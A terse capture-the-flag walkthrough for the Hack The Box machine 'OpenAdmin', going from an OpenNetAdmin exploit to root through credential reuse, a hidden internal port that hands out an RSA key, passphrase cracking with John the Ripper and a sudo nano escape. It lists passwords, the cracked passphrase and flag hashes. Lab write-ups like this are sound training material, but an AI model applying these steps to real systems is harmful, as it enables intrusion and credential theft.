


### Foothold
execute the exploit.sh to get a shell (found it from exploitdb
  when searched for OpenNetAdmin)


### User #1
got access to www-data user
$ cd local/config/; cat database_settings.inc.php

and get a pass

n1nj4W4rri0R!

this is for user jimmy


ssh jimmy@10.10.10.171 worked






### User #2

reading the /var/internal/ files we understand that we must do a curl with

curl -X POST http://10.10.10.171/internal/main.php -d 'username=jimmy&password=Revealed'

and we dont get a response



login to jimmy and exec the following

$ netstat -l

and we find a hidden port open, the 52846

curl -d "username=jimmy&password=Revealed" -X POST http://localhost:52846/main.php


now we got an rsa key for joanna as the main.php file says. we save it as joanna-id-rsa
if we do
$ chmod 600 joanna-id-rsa
$ ssh -i joanna-id-rsa joanna@10.10.10.171
we get asked for a passphrase

we use
ssh2john
$ python ~/JohnTheRipper/run/ssh2john.py ~/Documents/stationary/htb/boxes/openadmin/joanna-id-rsa > tocrack
$ john --wordlist=/usr/share/wordlists/rockyou.txt tocrack

passphrase is :
bloodninjas

login with
$ ssh -i joanna-id-rsa joanna@10.10.10.171

$ cat user.txt
c9b2cf07d40807e62af62660f0c81b5f



### root

while in joanna user, type sudo -l

execute the command, and then GTFOBins for nano

root hash:
2f907ed450b361b2c2bf4e8795d5b561
